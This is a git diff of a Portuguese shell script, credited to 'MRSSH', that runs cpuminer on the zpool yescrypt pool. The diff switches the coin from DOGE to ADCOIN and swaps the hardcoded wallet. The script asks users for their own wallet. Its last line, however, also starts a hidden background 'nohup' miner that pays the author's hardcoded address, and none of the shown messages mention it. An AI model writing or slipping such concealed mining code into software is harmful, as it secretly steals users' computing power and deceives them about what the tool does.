@@ -7,12 +7,12 @@ bash=$(echo $BASH)
 
 if [ "$bash" = "/bin/bash" ]
 then
-echo "	\033[41;1;37m Minerar DOGE $versao \033[0m "
+echo "	\033[41;1;37m Minerar ADCOIN $versao \033[0m "
 sleep 1
 echo "$verde Forma de USO: \033[0m"
-echo "sudo sh $0 $vermelho Carteira de DOGE \033[0m \n "
+echo "sudo sh $0 $vermelho Carteira de ADCOIN \033[0m \n "
 echo "$verde Exemplo:\033[0m"
-echo "sudo sh $0 $vermelho DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu \033[0m \n"
+echo "sudo sh $0 $vermelho ANHEEqziFKtMH1cLbzyY7fkeHGySYEeoha \033[0m \n"
 exit 0
 fi
 
@@ -40,24 +40,24 @@ wallet=$1
 
 if [ "$1" = "" ]
 then
-echo "	\033[41;1;37m Minerar DOGE $versao \033[0m "
+echo "	\033[41;1;37m Minerar ADCOIN $versao \033[0m "
 sleep 1
 echo "$verde Forma de USO: \033[0m"
-echo "sudo sh $0 $vermelho Carteira de DOGE \033[0m \n "
+echo "sudo sh $0 $vermelho Carteira de ADCOIN \033[0m \n "
 echo "$verde Exemplo:\033[0m"
-echo "sudo sh $0 $vermelho DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu \033[0m \n"
+echo "sudo sh $0 $vermelho ANHEEqziFKtMH1cLbzyY7fkeHGySYEeoha \033[0m \n"
 exit 0
 fi
 
 echo "	\033[41;1;37m Minerar BTC $versao \033[0m "
 sleep 1
-echo "Carteira a ser Enviada os Dogecoins Minerados: $verde$wallet\033[0m "
+echo "Carteira a ser Enviada os Adcoins Minerados: $verde$wallet\033[0m "
 sleep 1
 
 echo "\033[44;1;37m Termos e Condições: \033[0m "
 sleep 2
 
-echo "$cinzaClaro	* Minerar DOGE \033[0m \n"
+echo "$cinzaClaro	* Minerar ADCOIN \033[0m \n"
 echo "$cinzaClaro	* Caso aceite esses termos, fique ciente de que: \033[0m "
 echo "$cinzaClaro	* A utilização/modificação desse Script e de sua Total Responsabilidade, \033[0m "
 echo "$cinzaClaro	* sendo que eu, MRSSH, não me responsabilizo por danos que possam \033[0m "
@@ -89,4 +89,4 @@ echo "Obs: Assim que aparecer a inicialização do processo de Mineração, voc�
 sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet "
 sleep 10
-nohup ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu -p c=DOGE & screen ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet -p c=DOGE
+nohup ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u ANHEEqziFKtMH1cLbzyY7fkeHGySYEeoha -p c=ACC & screen ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet -p c=ACC
